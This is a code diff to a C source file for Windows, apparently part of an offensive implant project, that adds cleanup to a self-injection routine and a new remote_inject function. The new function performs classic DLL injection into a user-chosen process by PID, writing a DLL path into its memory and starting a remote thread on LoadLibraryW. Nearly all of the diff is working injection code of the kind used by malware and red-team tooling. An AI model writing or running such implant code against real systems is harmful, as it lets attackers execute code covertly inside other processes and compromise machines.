@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <windows.h>
 #include <memoryapi.h>
@@ -39,7 +40,64 @@ VOID inject_self(IMPLANT_CONFIG config) {
 			WaitForSingleObject(shell_thread, INFINITE);			
 		}
 
+		CloseHandle(shell_thread);
+		VirtualFree(allocate_mem, 0, MEM_RELEASE);
+
 	}
+
+VOID remote_inject() {
+	printf("Enter process PID to inject: ");
+	DWORD pid; 
+	scanf("%lu", &pid);
+
+	HANDLE remote_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+	if (remote_proc != NULL) {
+		printf("[x] Opened handle to process\n");
+	}
+	else {
+		printf("[-] Failed to open handle to remote process\n");
+	}
+
+	printf("Path of DLL to inject: ");
+	WCHAR dllPath[MAX_PATH] = { 0 };
+	wscanf(L"%s", dllPath);
+	SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+	LPVOID inject_addr = VirtualAllocEx(remote_proc, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (inject_addr != NULL) {
+		printf("[x] Allocated memory in process\n");
+	}
+	else {
+		printf("[-] Failed to allocate memory in process\n");
+	}
+
+	if (WriteProcessMemory(remote_proc, inject_addr, dllPath, dllPathSize, NULL)) {
+		printf("[x] Written DLL path to process\n");
+	}
+	else {
+		printf("[-] Failed to write DLL path to process\n");
+	}
+
+	LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
+	HANDLE thread_handle = CreateRemoteThread(remote_proc, NULL, 0,
+		(LPTHREAD_START_ROUTINE)loadLibAddr,  // function to run
+		inject_addr,                           // argument to pass
+		0, NULL);	
+
+	if (thread_handle != NULL) {
+		printf("[x] Created remote thread");
+		WaitForSingleObject(thread_handle, 5000);
+		CloseHandle(thread_handle);
+	}
+	else {
+		printf("[-] Failed to create remote thread");
+	}
+
+	VirtualFreeEx(remote_proc, inject_addr, 0, MEM_RELEASE);
+	CloseHandle(remote_proc);
+}
+
 
 
 
